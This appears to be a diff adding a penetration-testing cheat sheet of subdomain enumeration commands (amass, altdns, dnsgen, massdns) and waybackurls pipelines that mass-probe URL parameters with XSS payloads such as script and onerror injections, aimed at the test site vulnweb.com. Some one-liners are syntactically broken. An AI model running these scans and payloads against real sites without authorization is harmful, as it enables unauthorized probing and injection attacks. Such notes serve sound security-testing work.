@@ -1,0 +1,45 @@
+#1 amass 
+
+   amass enum -passive -d domain.com
+   
+   amass enum -brute -w [wordlist] -d [domain] -o [output_file] {OPTIONAL}
+
+   amass enum -brute -w [wordlist] -df [List_of_subdomains] -o [output_file] {OPTIONAL}
+
+   amass enum -passive -df [List_of_resolved_associated_subdomais] -o [output_file]
+   
+   amass enum -brute -w [wordlist] -df [List_of_resolved_associated_subdomais] -o [output_file] {OPTIONAL}
+
+#2 altdns
+
+   altdns.py -i [List_of_subdomains] -o [data_output] -w words.txt -r -s output_file.txt
+
+#3 dnsgen 
+
+   dnsgen [List_of_subdomains] -w [wordlist] | cat > [output_file]
+
+#4 massdns
+
+./bin/massdns -r lists/resolvers.txt -o s [List_of_subdomains] | grep -e ' A ' | cut -d 'A' -f 1 | rev | cut -d "." -f1 --complement | rev | sort | uniq > [output_file]
+
+# Wayback urls (JS file)
+
+waybackurls vulnweb.com | grep "\\.js" | xargs -n1 -I@ curl -k @ | tee -a content.txt
+
+
+waybackurls vulnweb.com | grep "\\.js" | uniq | sort
+
+
+# Waybackurls + gf + grep + qsreplace
+
+$ waybackurls vulnweb.com | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | wc -l [Filter files]
+
+$ waybackurls vulnweb.com | tee test-php.txt | qsreplace '"><script>confirm(1)</script>' | test-fuzz.json && cat test-fuzz.json | while read host do;do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033 [0;31mVulnerable\n" || echo "$host \033 [0;32mNotVulnerable\n";done
+
+$ cat test-php.txt | gf xss | grep "source=" | qsreplace '"><script>confirm(1)</script>' | while read host do;do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033 [0;31mVulnerable\n";done
+
+
+# Finding XSS
+
+1. echo http://testphp.vulnweb.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq
+2. subfinder -d vulnweb.com -silent -all | waybackurls | gf xss | sort -u | nuclei - tags xss -rl 20 -c 10 -o xss-report.txt 
